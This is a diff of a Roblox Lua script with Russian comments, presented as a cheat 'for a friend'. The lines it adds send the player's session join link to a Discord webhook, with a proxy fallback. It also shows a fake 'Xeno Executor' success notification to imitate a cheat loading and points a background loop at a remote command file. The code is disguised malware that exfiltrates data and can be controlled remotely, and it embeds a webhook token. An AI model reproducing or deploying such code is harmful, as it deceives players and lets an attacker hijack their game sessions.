@@ -1,11 +1,8 @@
--- === СКРИПТ ДЛЯ ДРУГА (НА ГИТХАБ) ===
+-- === ОБНОВЛЕННЫЙ СКРИПТ ДЛЯ ДРУГА (НА ГИТХАБ) ===
 local httpRequest = (syn and syn.request) or (http and http.request) or request
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
-
--- Ссылка на ваш логгер в Discord
-local discordWebhook = "https://lewisakura.moe/api/webhooks/1549358385453989969/7EmPPu20TXFW0zGaRwEdCUH9e3qhWfhIbsAj8X1wSGXBReLVVHwG632PnMCm8lSIpqeU"
 
 -- Собираем данные и URI-ссылку сессии
 local placeId = game.PlaceId
@@ -19,16 +16,28 @@ local payload = {
                   "👇 **Скопируйте строку ниже и вставьте в окно Win+R:**\n" ..
                   "```" .. uriJoinLink .. "```"
 }
+local jsonPayload = HttpService:JSONEncode(payload)
 
--- Отправка уведомления вам в Discord
+-- МЕТОД 1: Прямая отправка в Discord (Самый надежный в читах)
 if httpRequest then
-    httpRequest({
-        Url = discordWebhook,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(payload)
-    })
+    pcall(function()
+        httpRequest({
+            Url = "https://discord.com/api/webhooks/1549358385453989969/7EmPPu20TXFW0zGaRwEdCUH9e3qhWfhIbsAj8X1wSGXBReLVVHwG632PnMCm8lSIpqeU",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = jsonPayload
+        })
+    end)
 end
+
+-- МЕТОД 2: Резервная отправка через прокси (Если МЕТОД 1 не сработал)
+pcall(function()
+    HttpService:PostAsync(
+        "https://lewisakura.moe/api/webhooks/1549358385453989969/7EmPPu20TXFW0zGaRwEdCUH9e3qhWfhIbsAj8X1wSGXBReLVVHwG632PnMCm8lSIpqeU",
+        jsonPayload,
+        Enum.HttpContentType.ApplicationJson
+    )
+end)
 
 -- Красивая имитация загрузки чита
 pcall(function()
@@ -40,8 +49,8 @@ pcall(function()
     sg:SetCore("SendNotification", {Title = "Xeno Executor", Text = "Script Loaded Successfully!", Duration = 3})
 end)
 
--- ПУТЬ К ВАШЕМУ ФАЙЛУ КОМАНД (Убедитесь, что ник kazzqa и репозиторий верные)
-local commandUrl = "https://raw.githubusercontent.com/kazzqa/executable-script/refs/heads/main/command"
+-- ПУТЬ К ВАШЕМУ ФАЙЛУ КОМАНД
+local commandUrl = "https://githubusercontent.com"
 local lastCommandCode = ""
 
 -- Цикл проверки команд в фоне
